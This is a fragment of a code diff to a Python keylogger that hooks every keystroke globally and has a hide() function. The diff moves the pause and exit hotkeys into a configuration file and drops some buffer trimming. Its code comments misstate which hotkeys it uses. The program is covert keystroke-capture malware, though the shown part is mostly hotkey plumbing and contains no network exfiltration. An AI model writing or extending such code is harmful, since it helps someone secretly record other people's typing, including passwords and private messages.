@@ -145,7 +145,6 @@ def key_callback(event):
 
 def pause_logging():
     global paused, line_buffer
-    line_buffer = line_buffer.removesuffix("P")
     paused = not paused
 
 def hide():
@@ -157,12 +156,11 @@ def hide():
 def main():
     print(LOGGER_NAME + " started")
     keyboard.hook(key_callback)
-    # To Pause the Keylogger (ctrl + shift + e)
-    keyboard.add_hotkey('ctrl+shift+p', pause_logging)
-    # To Exit the Keylogger with safing the buffer (ctrl + shift + e)
-    keyboard.wait('ctrl+shift+e') 
+    # To Pause the Keylogger (ctrl + alt + e)
+    keyboard.add_hotkey(config["hotkeys"]["pause-hotkey"], pause_logging)
+    # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
+    keyboard.wait(config["hotkeys"]["exit-hotkey"]) 
     global line_buffer
-    line_buffer = line_buffer.removesuffix("E")
     log_local()
     if config["mode"] == 'debug':
         print(LOGGER_NAME + " stopped.")
